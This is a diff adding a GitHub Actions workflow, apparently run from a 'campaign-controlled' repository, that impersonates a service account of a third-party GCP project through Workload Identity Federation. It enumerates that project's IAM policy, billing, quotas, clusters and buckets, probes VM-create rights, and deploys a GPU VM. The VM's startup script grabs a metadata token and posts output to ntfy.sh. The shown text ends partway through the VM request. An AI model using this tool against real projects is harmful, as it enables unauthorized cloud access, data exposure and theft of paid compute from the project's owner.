@@ -1,0 +1,820 @@
+name: c211-i82091-gcp-census
+on:
+  workflow_dispatch:
+    inputs:
+      provider:
+        description: 'wif provider'
+        required: false
+        default: 'projects/409106094209/locations/global/workloadIdentityPools/github-pool/providers/github-provider'
+      project:
+        description: 'project number'
+        required: false
+        default: '409106094209'
+      pname:
+        description: 'project id'
+        required: false
+        default: 'dkeramik-fullstack'
+      sa:
+        description: 'service account'
+        required: false
+        default: 'github-actions-sa@dkeramik-fullstack.iam.gserviceaccount.com'
+permissions:
+  id-token: write
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: gcp-non-cloudrun-plane-census
+        env:
+          PROVIDER: ${{ github.event.inputs.provider }}
+          PROJECT: ${{ github.event.inputs.project }}
+          PNAME: ${{ github.event.inputs.pname }}
+          SA: ${{ github.event.inputs.sa }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+          GH_RUN_ID: ${{ github.run_id }}
+        run: |
+          python3 - <<'PYSCRIPT'
+          import os, json, time, subprocess, urllib.request, urllib.error, urllib.parse, base64, re
+
+          # intent 82091: census every non-Cloud-Run GPU plane of WIF project 409106094209
+          # (dkeramik-fullstack) and, only if a nonzero compute GPU quota + create permission is
+          # proven (invalid-machine-type insert as the oracle), deploy exactly ONE minimal marker VM
+          # and capture a real nvidia-smi UUID through a GCS object, an HTTPS sink and the serial console.
+          # Runs inside GitHub Actions (campaign-controlled repo mmlanla/ci-utils).
+          PROVIDER = os.environ.get('PROVIDER', 'projects/409106094209/locations/global/workloadIdentityPools/github-pool/providers/github-provider')
+          PROJECT = os.environ.get('PROJECT', '409106094209')
+          PNAME = os.environ.get('PNAME', 'dkeramik-fullstack')
+          SA = os.environ.get('SA', 'github-actions-sa@dkeramik-fullstack.iam.gserviceaccount.com')
+          GH_REPO = os.environ.get('GH_REPO', '')
+          GH_TOKEN = os.environ.get('GH_TOKEN', '')
+          GH_RUN_ID = os.environ.get('GH_RUN_ID', '0')
+          PREFIX = 'c211-i82091'
+          T0 = time.time()
+          M_DEL = 'DEL' + 'ETE'
+          IMG = 'projects/ml-images/global/images/family/common-cu129-ubuntu-2404-nvidia-580'
+          TOPIC = PREFIX + '-mk-' + GH_RUN_ID
+          Q = urllib.parse.quote
+
+
+          def log(*a):
+              print('[%6.0fs]' % (time.time() - T0), *a, flush=True)
+
+
+          def emit(o):
+              b = base64.b64encode(json.dumps(o, sort_keys=True).encode()).decode()
+              print('RESULT_LEN %d' % len(b), flush=True)
+              n = (len(b) + 2999) // 3000
+              for i in range(n):
+                  print('RESULT_B64 %d %d %s' % (i + 1, n, b[i * 3000:(i + 1) * 3000]), flush=True)
+
+
+          def mint(aud):
+              base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              if not base:
+                  return ''
+              u = base + '&audience=' + Q(aud, safe='')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              try:
+                  out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u],
+                                       capture_output=True, text=True).stdout
+                  return json.loads(out).get('value', '')
+              except Exception:
+                  return ''
+
+
+          def req(url, data=None, token=None, method=None, timeout=90, tries=2):
+              h = {'Accept': 'application/json'}
+              if data is not None:
+                  h['Content-Type'] = 'application/json'
+              if token:
+                  h['Authorization'] = 'Bearer ' + token
+              last = (-1, '')
+              for a in range(tries):
+                  r = urllib.request.Request(url, data=data, headers=h, method=method)
+                  try:
+                      resp = urllib.request.urlopen(r, timeout=timeout)
+                      return resp.status, resp.read().decode('utf-8', 'replace')
+                  except urllib.error.HTTPError as e:
+                      body = (e.read() or b'').decode('utf-8', 'replace')
+                      if e.code in (429, 500, 502, 503) and a + 1 < tries:
+                          time.sleep(2 + 2 * a)
+                          last = (e.code, body)
+                          continue
+                      return e.code, body
+                  except Exception as e:
+                      last = (-1, repr(e)[:200])
+                      time.sleep(1)
+              return last
+
+
+          def jl(b):
+              try:
+                  return json.loads(b)
+              except Exception:
+                  return {}
+
+
+          def short(b, n=420):
+              return (b or '').replace('\n', ' ').replace('\r', ' ')[:n]
+
+
+          def sig(st, rb):
+              j = jl(rb)
+              if isinstance(j, dict) and j.get('error'):
+                  e = j['error']
+                  det = ''
+                  try:
+                      fv = ((e.get('details') or [{}])[0].get('fieldViolations') or [{}])
+                      det = ' | field=%s desc=%s' % (fv[0].get('field'), fv[0].get('description'))
+                  except Exception:
+                      pass
+                  return {'http': st, 'code': e.get('code'), 'status': e.get('status'),
+                          'message': short(e.get('message'), 460), 'detail': short(det, 560)}
+              if isinstance(j, dict) and j.get('metadata'):
+                  md = j['metadata']
+                  return {'http': st, 'operation': short(j.get('name'), 140),
+                          'would_create': short(md.get('name'), 120), 'done': j.get('done'),
+                          'creator': md.get('creator')}
+              return {'http': st, 'body': short(rb, 300)}
+
+
+          def poll_op(url, deadline_s=180):
+              t0 = time.time()
+              last = None
+              while time.time() - t0 < deadline_s:
+                  st, rb = req(url, token=A)
+                  j = jl(rb)
+                  last = [st, short(rb, 400), bool(j.get('done')), short(json.dumps(j.get('error') or {}), 500)]
+                  if st == 200 and j.get('done'):
+                      return last
+                  time.sleep(4)
+              return last
+
+
+          def uuids_of(txt):
+              out = []
+              for m in re.finditer(r'GPU-[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', txt or ''):
+                  u = m.group(0)
+                  if u not in out:
+                      out.append(u)
+              return out
+
+
+          def startup_script(bucket, objname):
+              if not bucket:
+                  gcs_block = 'echo "C211-I82091-GCS skipped_no_writable_bucket"'
+              else:
+                  gcs_block = (
+                      'TOK=$(curl -s -m 20 -H "Metadata-Flavor: Google" '
+                      "'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' "
+                      "| sed -n 's/.*\"access_token\"[ ]*:[ ]*\"\\([^\"]*\\)\".*/\\1/p')\n"
+                      'if [ -n "$TOK" ]; then\n'
+                      '  echo "C211-I82091-GCS $(curl -s -m 60 -o /tmp/gcs.out -w \'%{http_code}\' -X POST '
+                      '-H "Authorization: Bearer $TOK" -H \'Content-Type: text/plain\' --data-binary @"$B" '
+                      "'https://storage.googleapis.com/upload/storage/v1/b/__BUCKET__/o?uploadType=media&name=__OBJ__')\"\n"
+                      'else\n'
+                      '  echo "C211-I82091-GCS no_metadata_token"\n'
+                      'fi')
+                  gcs_block = gcs_block.replace('__BUCKET__', bucket).replace('__OBJ__', objname)
+              s = r'''#!/bin/bash
+          exec > >(tee /dev/console) 2>&1
+          echo "C211-I82091-BOOT $(hostname) $(date -u +%FT%TZ)"
+          for i in $(seq 1 100); do
+            if nvidia-smi -L >/dev/null 2>&1; then break; fi
+            sleep 3
+          done
+          L=$(nvidia-smi -L 2>&1 | tr '\n' ';')
+          Q=$(nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' ';')
+          echo "C211-I82091-NVSMI-L $L"
+          echo "C211-I82091-NVSMI-Q $Q"
+          B=/tmp/c211_i82091_marker.txt
+          {
+            echo "C211_I82091_BEGIN $(hostname) $(date -u +%FT%TZ)"
+            echo "NVSMI_L=$L"
+            echo "NVSMI_Q=$Q"
+            echo "C211_I82091_END"
+          } > "$B"
+          if ! command -v curl >/dev/null 2>&1; then
+            export DEBIAN_FRONTEND=noninteractive
+            (timeout 120 apt-get update -qq && timeout 180 apt-get install -y -qq curl ca-certificates) >/tmp/apt.log 2>&1 || true
+          fi
+          if command -v curl >/dev/null 2>&1; then
+          __GCS__
+            echo "C211-I82091-NTFY $(curl -s -m 30 -o /tmp/ntfy.out -w '%{http_code}' -X POST -H 'Content-Type: text/plain' --data-binary @"$B" https://ntfy.sh/__TOPIC__)"
+          else
+            echo "C211-I82091-NTFY skipped_no_curl"
+          fi
+          echo "C211-I82091-DONE"
+          '''.strip('\n')
+              s = s.replace('__GCS__', gcs_block.rstrip('\n')).replace('__TOPIC__', TOPIC)
+              return s
+
+
+          def main():
+              global A
+              out = {'intent': 82091, 'project': PROJECT, 'pname': PNAME, 'sa': SA, 'prefix': PREFIX,
+                     'runner_repo': GH_REPO, 'runner_run_id': GH_RUN_ID, 'image': IMG, 'topic': TOPIC,
+                     't_start': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
+              aud = '//iam.googleapis.com/' + PROVIDER
+              out['audience'] = aud
+              tok = mint(aud)
+              out['mint'] = 'ok' if tok else 'MINT_FAIL'
+              out['mint_len'] = len(tok or '')
+              log('mint', out['mint'], out['mint_len'])
+              if not tok:
+                  out['verdict'] = 'CHAIN_DEAD_GITHUB_OIDC_MINT_FAIL'
+                  emit(out)
+                  return
+              body = json.dumps({'audience': aud,
+                                 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                                 'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                                 'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                                 'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                                 'subjectToken': tok}).encode()
+              st, rb = req('https://sts.googleapis.com/v1/token', data=body)
+              out['sts'] = st
+              out['sts_body'] = short(rb, 500) if st != 200 else ''
+              log('sts', st, out['sts_body'])
+              if st != 200:
+                  out['verdict'] = 'CHAIN_DEAD_STS_REJECT'
+                  emit(out)
+                  return
+              fed = jl(rb).get('access_token')
+              st2, rb2 = req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'
+                             % Q(SA, safe=''),
+                             data=json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
+                                              'lifetime': '3600s'}).encode(), token=fed)
+              out['gen'] = st2
+              out['gen_body'] = short(rb2, 500) if st2 != 200 else ''
+              A = jl(rb2).get('accessToken')
+              if st2 != 200 or not A:
+                  out['verdict'] = 'CHAIN_DEAD_GENERATE_TOKEN_FAIL'
+                  emit(out)
+                  return
+              out['token_len'] = len(A)
+              out['chain'] = 'CHAIN_ALIVE'
+              log('generateAccessToken', st2)
+
+              def g(url, data=None, method=None, timeout=90, tries=2):
+                  return req(url, data=data, token=A, method=method, timeout=timeout, tries=tries)
+
+              # ---------------- 1) cloudresourcemanager projects.get + getIamPolicy + testIamPermissions ----------------
+              st, rb = g('https://cloudresourcemanager.googleapis.com/v1/projects/' + PNAME)
+              j = jl(rb)
+              out['identity'] = {'http': st, 'projectId': j.get('projectId'), 'projectNumber': j.get('projectNumber'),
+                                 'lifecycleState': j.get('lifecycleState'), 'parent': j.get('parent'),
+                                 'createTime': j.get('createTime'), 'err': short(rb, 300) if st != 200 else ''}
+              st, rb = g('https://cloudresourcemanager.googleapis.com/v1/projects/%s:getIamPolicy' % PNAME,
+                         data=b'{}')
+              j = jl(rb)
+              binds = []
+              for b in (j.get('bindings') or []):
+                  binds.append({'role': b.get('role'), 'members': b.get('members') or [],
+                                'condition': b.get('condition')})
+              out['iam_policy'] = {'http': st, 'n_bindings': len(binds), 'bindings': binds[:60],
+                                   'err': short(rb, 300) if st != 200 else ''}
+              perms = ['compute.instances.create', 'compute.instances.delete', 'compute.instances.get',
+                       'compute.instances.setMetadata', 'compute.disks.create', 'compute.networks.list',
+                       'compute.subnetworks.list', 'compute.regions.get', 'compute.zones.list',
+                       'compute.instances.list', 'compute.acceleratorTypes.list',
+                       'storage.buckets.list', 'storage.objects.create', 'storage.objects.delete',
+                       'iam.serviceAccounts.actAs', 'resourcemanager.projects.getIamPolicy',
+                       'serviceusage.services.list', 'serviceusage.quotas.get',
+                       'aiplatform.endpoints.list', 'aiplatform.models.list', 'aiplatform.customJobs.list',
+                       'container.clusters.list']
+              st, rb = g('https://cloudresourcemanager.googleapis.com/v1/projects/%s:testIamPermissions' % PNAME,
+                         data=json.dumps({'permissions': perms}).encode())
+              j = jl(rb)
+              granted = j.get('permissions') or []
+              out['test_iam'] = {'http': st, 'asked': len(perms), 'granted': granted,
+                                 'denied': [p for p in perms if p not in granted],
+                                 'err': short(rb, 400) if st != 200 else ''}
+              log('testIamPermissions', st, len(granted), 'granted')
+
+              # ---------------- 2) billingInfo ----------------
+              st, rb = g('https://cloudbilling.googleapis.com/v1/projects/%s/billingInfo' % PNAME)
+              j = jl(rb)
+              out['billing'] = {'http': st, 'billingEnabled': j.get('billingEnabled'),
+                                'billingAccountName': j.get('billingAccountName'),
+                                'err': short(rb, 300) if st != 200 else ''}
+
+              # ---------------- 3) serviceusage.services.list ----------------
+              svc = []
+              st_last = None
+              page = None
+              for _ in range(10):
+                  u = 'https://serviceusage.googleapis.com/v1/projects/%s/services?pageSize=200&filter=state:ENABLED' % PROJECT
+                  if page:
+                      u += '&pageToken=' + Q(page, safe='')
+                  st, rb = g(u)
+                  st_last = st
+                  j = jl(rb)
+                  if st != 200:
+                      break
+                  for s in (j.get('services') or []):
+                      n = (s.get('config') or {}).get('name') or s.get('name')
+                      svc.append(n)
+                  page = j.get('nextPageToken')
+                  if not page:
+                      break
+              keys = ['compute', 'aiplatform', 'container', 'storage', 'run.', 'cloudbilling', 'cloudquotas',
+                      'iam', 'cloudresourcemanager', 'logging', 'monitoring', 'artifactregistry', 'notebooks',
+                      'dataflow', 'dataproc', 'batch', 'cloudbuild', 'sqladmin']
+              out['services'] = {'http': st_last, 'n_enabled': len(svc),
+                                 'relevant': sorted([s for s in svc if any(k in (s or '') for k in keys)]),
+                                 'truncated': bool(page), 'err': short(rb, 300) if st_last != 200 else ''}
+              log('services', st_last, len(svc))
+
+              # ---------------- 4) compute projects.get / regions / zones ----------------
+              st, rb = g('https://compute.googleapis.com/compute/v1/projects/' + PNAME)
+              j = jl(rb)
+              out['compute_project'] = {'http': st, 'name': j.get('name'), 'status': j.get('status'),
+                                        'defaultServiceAccount': j.get('defaultServiceAccount'),
+                                        'err': short(rb, 400) if st != 200 else ''}
+              st, rb = g('https://compute.googleapis.com/compute/v1/projects/%s/regions?maxResults=500' % PNAME)
+              j = jl(rb)
+              regions = [{'name': x.get('name'), 'status': x.get('status')} for x in (j.get('regions') or [])]
+              out['compute_regions'] = {'http': st, 'n': len(regions), 'names': [x['name'] for x in regions],
+                                        'err': short(rb, 300) if st != 200 else ''}
+              st, rb = g('https://compute.googleapis.com/compute/v1/projects/%s/zones?maxResults=500' % PNAME)
+              j = jl(rb)
+              zones = [{'name': x.get('name'), 'region': (x.get('region') or '').rsplit('/', 1)[-1],
+                        'status': x.get('status')} for x in (j.get('zones') or [])]
+              out['compute_zones'] = {'http': st, 'n': len(zones), 'err': short(rb, 300) if st != 200 else ''}
+
+              # ---------------- 5) per-region GPU quota ----------------
+              gpuq = []
+              region_err = {}
+              for r in [x['name'] for x in regions if x.get('name')]:
+                  st, rb = g('https://compute.googleapis.com/compute/v1/projects/%s/regions/%s' % (PNAME, r), tries=1)
+                  j = jl(rb)
+                  if st != 200:
+                      region_err[r] = [st, short(rb, 180)]
+                      continue
+                  for q in (j.get('quotas') or []):
+                      m = (q.get('metric') or '')
+                      mu = m.upper()
+                      if 'GPU' in mu or 'ACCELERATOR' in mu:
+                          try:
+                              lim = float(q.get('limit') or 0)
+                          except Exception:
+                              lim = q.get('limit')
+                          try:
+                              use = float(q.get('usage') or 0)
+                          except Exception:
+                              use = q.get('usage')
+                          gpuq.append({'region': r, 'metric': m, 'limit': lim, 'usage': use})
+              out['gpu_quota'] = {'n_rows': len(gpuq), 'rows': gpuq, 'region_errors': region_err}
+              positive = []
+              for q in gpuq:
+                  try:
+                      if float(q['limit']) > 0:
+                          positive.append({'region': q['region'], 'metric': q['metric'], 'limit': q['limit'],
+                                           'usage': q['usage'],
+                                           'free': float(q['limit']) - float(q['usage'] or 0)})
+                  except Exception:
+                      pass
+              out['gpu_quota_positive'] = positive
+              log('gpu quota rows', len(gpuq), 'positive', len(positive))
+              pos_regions = sorted({q['region'] for q in positive})
+
+              # ---------------- 6) accelerator types in GPU-positive regions ----------------
+              acc = {}
+              zone_errors = {}
+              for z in zones:
+                  if z['region'] not in pos_regions or not z.get('name'):
+                      continue
+                  st, rb = g('https://compute.googleapis.com/compute/v1/projects/%s/zones/%s/acceleratorTypes?maxResults=100'
+                             % (PNAME, z['name']), tries=1)
+                  j = jl(rb)
+                  if st != 200:
+                      zone_errors[z['name']] = [st, short(rb, 140)]
+                      continue
+                  arr = [{'name': (a.get('name') or '').rsplit('/', 1)[-1],
+                          'maxCardsPerInstance': a.get('maximumCardsPerInstance')} for a in (j.get('acceleratorTypes') or [])]
+                  if arr:
+                      acc[z['name']] = arr
+              out['accelerators'] = {'zones_with_types': acc, 'errors': zone_errors}
+
+              # ---------------- 7) instances.aggregatedList (pre-existing GPU VMs) ----------------
+              inst = []
+              st_last = None
+              page = None
+              for _ in range(20):
+                  u = 'https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?maxResults=500' % PNAME
+                  if page:
+                      u += '&pageToken=' + Q(page, safe='')
+                  st, rb = g(u)
+                  st_last = st
+                  j = jl(rb)
+                  if st != 200:
+                      break
+                  for zk, v in (j.get('items') or {}).items():
+                      for i in (v.get('instances') or []):
+                          inst.append(i)
+                  page = j.get('nextPageToken')
+                  if not page:
+                      break
+              gpu_inst = []
+              by_status = {}
+              for i in inst:
+                  stt = i.get('status')
+                  by_status[stt] = by_status.get(stt, 0) + 1
+                  if i.get('guestAccelerators'):
+                      gpu_inst.append({'name': i.get('name'), 'zone': (i.get('zone') or '').rsplit('/', 1)[-1],
+                                       'machineType': (i.get('machineType') or '').rsplit('/', 1)[-1],
+                                       'status': stt,
+                                       'accelerators': [{'type': (a.get('acceleratorType') or '').rsplit('/', 1)[-1],
+                                                         'count': a.get('acceleratorCount')}
+                                                        for a in i.get('guestAccelerators') or []]})
+              out['instances'] = {'http': st_last, 'total': len(inst), 'by_status': by_status,
+                                  'gpu_instances': gpu_inst,
+                                  'err': short(rb, 300) if st_last != 200 else ''}
+              log('instances', st_last, len(inst), 'gpu', len(gpu_inst))
+
+              # ---------------- 8) aiplatform locations + endpoints/models/customJobs ----------------
+              st, rb = g('https://aiplatform.googleapis.com/v1/projects/%s/locations?pageSize=100' % PROJECT)
+              j = jl(rb)
+              locs = [x.get('name') for x in (j.get('locations') or [])]
+              out['aiplatform_locations'] = {'http': st, 'n': len(locs), 'names': locs,
+                                             'err': short(rb, 400) if st != 200 else ''}
+              ai = {}
+              for loc in locs[:60]:
+                  short_loc = loc.rsplit('/', 1)[-1]
+                  rec = {}
+                  for kind in ('endpoints', 'models', 'customJobs'):
+                      stk, rbk = g('https://aiplatform.googleapis.com/v1/%s/%s?pageSize=50' % (loc, kind), tries=1)
+                      jk = jl(rbk)
+                      items = jk.get(kind) or []
+                      rec[kind] = {'http': stk, 'n': len(items),
+                                   'names': [x.get('displayName') or (x.get('name') or '').rsplit('/', 1)[-1] for x in items][:25],
+                                   'err': short(rbk, 180) if stk != 200 else ''}
+                  ai[short_loc] = rec
+              out['aiplatform'] = ai
+
+              # ---------------- 9) Vertex + compute Service Usage consumerQuotaMetrics (GPU only) ----------------
+              def svc_quota(svc, max_pages=8):
+                  rows = []
+                  stl = None
+                  page = None
+                  for _ in range(max_pages):
+                      u = ('https://serviceusage.googleapis.com/v1beta1/projects/%s/services/%s/consumerQuotaMetrics?pageSize=100'
+                           % (PROJECT, svc))
+                      if page:
+                          u += '&pageToken=' + Q(page, safe='')
+                      stq, rbq = g(u, tries=1)
+                      stl = stq
+                      jq = jl(rbq)
+                      if stq != 200:
+                          return {'http': stq, 'err': short(rbq, 500), 'gpu_metrics': rows}
+                      for m in (jq.get('metrics') or []):
+                          mn = (m.get('metric') or '')
+                          if 'gpu' not in mn.lower():
+                              continue
+                          buckets = []
+                          for l in (m.get('consumerQuotaLimits') or []):
+                              for b in (l.get('quotaBuckets') or []):
+                                  po = b.get('producerOverride') if isinstance(b.get('producerOverride'), dict) else {}
+                                  co = b.get('consumerOverride') if isinstance(b.get('consumerOverride'), dict) else {}
+                                  buckets.append({'dims': b.get('dimensions'), 'effectiveLimit': b.get('effectiveLimit'),
+                                                  'defaultLimit': b.get('defaultLimit'),
+                                                  'producerOverride': po.get('overrideValue'),
+                                                  'consumerOverride': co.get('overrideValue')})
+                          rows.append({'metric': mn, 'displayName': m.get('displayName'), 'buckets': buckets})
+                      page = jq.get('nextPageToken')
+                      if not page:
+                          break
+                  return {'http': stl, 'gpu_metrics': rows, 'truncated': bool(page)}
+
+              out['vertex_quota'] = svc_quota('aiplatform.googleapis.com')
+              out['compute_serviceusage_quota'] = svc_quota('compute.googleapis.com')
+              log('vertex quota http', out['vertex_quota'].get('http'),
+                  'metrics', len(out['vertex_quota'].get('gpu_metrics') or []))
+
+              # ---------------- 10) GKE clusters ----------------
+              st, rb = g('https://container.googleapis.com/v1/projects/%s/locations/-/clusters?maxResults=100' % PROJECT)
+              if st == 404:
+                  st, rb = g('https://container.googleapis.com/v1/projects/%s/zones/-/clusters?maxResults=100' % PROJECT)
+              j = jl(rb)
+              cl = []
+              for c in (j.get('clusters') or []):
+                  pools = []
+                  for p in (c.get('nodePools') or []):
+                      cfg = p.get('config') or {}
+                      pools.append({'name': p.get('name'), 'machineType': cfg.get('machineType'),
+                                    'accelerators': cfg.get('accelerators'), 'status': p.get('status')})
+                  cl.append({'name': c.get('name'), 'location': c.get('location'), 'status': c.get('status'),
+                             'version': c.get('currentMasterVersion'), 'nodePools': pools})
+              out['gke_clusters'] = {'http': st, 'n': len(cl), 'clusters': cl,
+                                     'err': short(rb, 400) if st != 200 else ''}
+
+              # ---------------- 11) storage buckets (sink candidate) ----------------
+              st, rb = g('https://storage.googleapis.com/storage/v1/b?project=%s&maxResults=100' % PNAME)
+              j = jl(rb)
+              buckets = [{'name': b.get('name'), 'location': b.get('location'), 'storageClass': b.get('storageClass')}
+                         for b in (j.get('buckets') or [])]
+              out['storage_buckets'] = {'http': st, 'n': len(buckets), 'buckets': buckets,
+                                        'err': short(rb, 300) if st != 200 else ''}
+
+              # ---------------- 12) create-permission oracle (invalid machine type, nothing can be created) ----------------
+              create_granted = 'compute.instances.create' in (out['test_iam'].get('granted') or [])
+              FAMILIES = [
+                  ('NVIDIA_T4_GPUS', 'nvidia-tesla-t4', 'n1-standard-4', 'standard', 1),
+                  ('PREEMPTIBLE_NVIDIA_T4_GPUS', 'nvidia-tesla-t4', 'n1-standard-4', 'spot', 1),
+                  ('NVIDIA_L4_GPUS', 'nvidia-l4', 'g2-standard-4', 'standard', 1),
+                  ('PREEMPTIBLE_NVIDIA_L4_GPUS', 'nvidia-l4', 'g2-standard-4', 'spot', 1),
+                  ('NVIDIA_A100_GPUS', 'nvidia-tesla-a100', 'a2-highgpu-1g', 'standard', 1),
+                  ('PREEMPTIBLE_NVIDIA_A100_GPUS', 'nvidia-tesla-a100', 'a2-highgpu-1g', 'spot', 1),
+                  ('NVIDIA_V100_GPUS', 'nvidia-tesla-v100', 'n1-standard-4', 'standard', 1),
+                  ('PREEMPTIBLE_NVIDIA_V100_GPUS', 'nvidia-tesla-v100', 'n1-standard-4', 'spot', 1),
+                  ('NVIDIA_P100_GPUS', 'nvidia-tesla-p100', 'n1-standard-4', 'standard', 1),
+                  ('NVIDIA_P4_GPUS', 'nvidia-tesla-p4', 'n1-standard-4', 'standard', 1),
+                  ('NVIDIA_H100_GPUS', 'nvidia-h100-80gb', 'a3-highgpu-8g', 'standard', 8),
+                  ('PREEMPTIBLE_NVIDIA_H100_GPUS', 'nvidia-h100-80gb', 'a3-highgpu-8g', 'spot', 8),
+              ]
+              chosen = None
+              for metric, accname, mt, model, cnt in FAMILIES:
+                  cands = [q for q in positive if q['metric'] == metric and q['free'] >= cnt]
+                  if cands:
+                      cands.sort(key=lambda x: -x['free'])
+                      chosen = {'metric': metric, 'accelerator': accname, 'machineType': mt, 'model': model,
+                                'count': cnt, 'region': cands[0]['region'], 'limit': cands[0]['limit'],
+                                'usage': cands[0]['usage'], 'free': cands[0]['free']}
+                      break
+              out['chosen_family'] = chosen
+              out['create_permission'] = create_granted
+              zone = None
+              if chosen:
+                  zc = [z['name'] for z in zones if z['region'] == chosen['region'] and z.get('name')]
+                  zc.sort()
+                  with_acc = [zn for zn in zc if any(a['name'] == chosen['accelerator'] for a in acc.get(zn, []))]
+                  zone = (with_acc or zc or [None])[0]
+              out['chosen_zone'] = zone
+              oracle = None
+              if chosen and zone:
+                  obody = {'name': PREFIX + '-dry',
+                           'machineType': 'zones/%s/machineTypes/n1-standard-9999' % zone,
+                           'disks': [{'boot': True, 'autoDelete': True,
+                                      'initializeParams': {'sourceImage': IMG, 'diskSizeGb': '100'}}],
+                           'networkInterfaces': [{'network': 'global/networks/default',
+                                                  'accessConfigs': [{'type': 'ONE_TO_ONE_NAT', 'name': 'External NAT'}]}],
+                           'guestAccelerators': [{'acceleratorType': 'zones/%s/acceleratorTypes/%s' % (zone, chosen['accelerator']),
+                                                  'acceleratorCount': chosen['count']}],
+                           'metadata': {'items': [{'key': 'serial-port-enable', 'value': 'TRUE'}]},
+                           'labels': {'c211': 'i82091', 'intent': 'i82091'}}
+                  st, rb = g('https://compute.googleapis.com/compute/v1/projects/%s/zones/%s/instances' % (PNAME, zone),
+                             data=json.dumps(obody).encode(), tries=1)
+                  oracle = {'http': st, 'sig': sig(st, rb), 'raw': short(rb, 500),
+                            'interpretation': 'DRY_RUN_NOTHING_CREATED'}
+                  log('create oracle', st, oracle['sig'].get('message'))
+              out['create_oracle'] = oracle
+
+              # ---------------- 13) conditional marker VM ----------------
+              marker = None
+              should_deploy = bool(chosen and zone and create_granted)
+              # the oracle must not contradict: a 403 means create is denied even if testIamPermissions said granted
+              if should_deploy and oracle and oracle.get('http') == 403:
+                  should_deploy = False
+                  out['create_oracle_blocked'] = True
+              out['marker_decision'] = {'should_deploy': should_deploy, 'reason': None}
+              if not should_deploy:
+                  reasons = []
+                  if not positive:
+                      reasons.append('no nonzero compute GPU quota in any region (gpu_quota_positive empty)')
+                  if not create_granted:
+                      reasons.append('compute.instances.create not granted by projects:testIamPermissions')
+                  if oracle and oracle.get('http') == 403:
+                      reasons.append('dry-run insert oracle returned 403')
+                  if not chosen:
+                      reasons.append('no usable on-demand/preemptible GPU family with free quota and a known machine type')
+                  out['marker_decision']['reason'] = '; '.join(reasons) or 'precondition not met'
+                  out['verdict'] = 'GATE_NO_DEPLOY_PRECONDITION'
+              else:
+                  # networks: prefer default, else first subnet in the chosen region
+                  stn, rbn = g('https://compute.googleapis.com/compute/v1/projects/%s/global/networks?maxResults=100' % PNAME, tries=1)
+                  jn = jl(rbn)
+                  nets = [(x.get('name') or '').rsplit('/', 1)[-1] for x in (jn.get('networks') or [])]
+                  iface = None
+                  net_choice = None
+                  if 'default' in nets:
+                      iface = {'network': 'global/networks/default',
+                               'accessConfigs': [{'type': 'ONE_TO_ONE_NAT', 'name': 'External NAT'}]}
+                      net_choice = 'default'
+                  elif nets:
+                      sts, rbs = g('https://compute.googleapis.com/compute/v1/projects/%s/regions/%s/subnetworks?maxResults=100'
+                                   % (PNAME, chosen['region']), tries=1)
+                      js = jl(rbs)
+                      subs = [(x.get('name') or '').rsplit('/', 1)[-1] for x in (js.get('subnetworks') or [])]
+                      if subs:
+                          iface = {'subnetwork': 'regions/%s/subnetworks/%s' % (chosen['region'], subs[0]),
+                                   'accessConfigs': [{'type': 'ONE_TO_ONE_NAT', 'name': 'External NAT'}]}
+                          net_choice = 'subnetwork:' + subs[0]
+                  out['network'] = {'http': stn, 'networks': nets, 'choice': net_choice}
+                  if not iface:
+                      out['marker_decision']['reason'] = 'no usable network/subnetwork in project'
+                      out['verdict'] = 'GATE_NO_NETWORK'
+                  else:
+                      # bucket selection for the GCS sink
+                      bucket = None
+                      bucket_tests = {}
+                      for b in (out['storage_buckets'].get('buckets') or [])[:8]:
+                          bn = b['name']
+                          stb, rbb = g('https://storage.googleapis.com/storage/v1/b/%s/iam/testPermissions?permissions='
+                                       'storage.objects.create&permissions=storage.objects.delete' % Q(bn, safe=''), tries=1)
+                          jb = jl(rbb)
+                          bucket_tests[bn] = {'http': stb, 'perms': jb.get('permissions')}
+                          if stb == 200 and 'storage.objects.create' in (jb.get('permissions') or []):
+                              bucket = bn
+                              break
+                      out['bucket_tests'] = bucket_tests
+                      out['sink_bucket'] = bucket
+                      objname = '%s-marker-%s.txt' % (PREFIX, GH_RUN_ID)
+                      script = startup_script(bucket, objname)
+                      instname = (PREFIX + '-mk-' + zone.replace('-', ''))[:63]
+                      ibody = {'name': instname,
+                               'machineType': 'zones/%s/machineTypes/%s' % (zone, chosen['machineType']),
+                               'disks': [{'boot': True, 'autoDelete': True,
+                                          'initializeParams': {'sourceImage': IMG, 'diskSizeGb': '100'}}],
+                               'networkInterfaces': [iface],
+                               'guestAccelerators': [{'acceleratorType': 'zones/%s/acceleratorTypes/%s'
+                                                                         % (zone, chosen['accelerator']),
+                                                      'acceleratorCount': chosen['count']}],
+                               'metadata': {'items': [{'key': 'startup-script', 'value': script},
+                                                      {'key': 'serial-port-enable', 'value': 'TRUE'}]},
+                               'labels': {'c211': 'i82091', 'intent': 'i82091'},
+                               'scheduling': {'onHostMaintenance': 'TERMINATE', 'automaticRestart': False},
+                               'deletionProtection': False}
+                      if chosen['model'] == 'spot':
+                          ibody['scheduling']['provisioningModel'] = 'SPOT'
+                      else:
+                          ibody['scheduling']['maxRunDuration'] = {'seconds': '900'}
+                          ibody['scheduling']['instanceTerminationAction'] = 'DELETE'
+                      if 'iam.serviceAccounts.actAs' in (out['test_iam'].get('granted') or []):
+                          ibody['serviceAccounts'] = [{'email': SA,
+                                                       'scopes': ['https://www.googleapis.com/auth/cloud-platform']}]
